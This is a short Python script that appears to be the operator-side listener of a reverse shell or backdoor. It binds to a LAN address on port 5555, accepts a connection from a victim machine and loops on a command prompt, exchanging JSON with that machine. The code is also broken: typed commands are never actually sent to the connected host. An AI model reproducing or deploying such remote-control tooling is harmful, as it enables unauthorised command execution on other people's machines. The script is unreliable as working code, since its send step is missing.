#!/usr/bin/python

import socket
import json
import sys

class Allclient:
    def __init__(self, ip, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, int(port))) 
        self.server.listen(3)
        print("[+] Wait...Connection....")
        self.connection, address = self.server.accept()
        print("[+] OK..Connect >: " + str(address))

    def execute_remote(self, cmd):
        if cmd[0] == "exit":
            self.connection.close()
            exit()
        return self.connect_receive()

    def connect_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def connect_receive(self):
        json_data = " "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def run_cmd(self):
        while True:
            try:
                cmd = input("Type me >>> : ").split(" ")

                result = self.execute_remote(cmd)
            except Exception as e:
                result = f"[-] Error cmd execution: {str(e)}"
            
            print(result)

if __name__ == "__main__":
    server = Allclient("192.168.1.135", 5555)
    server.run_cmd()
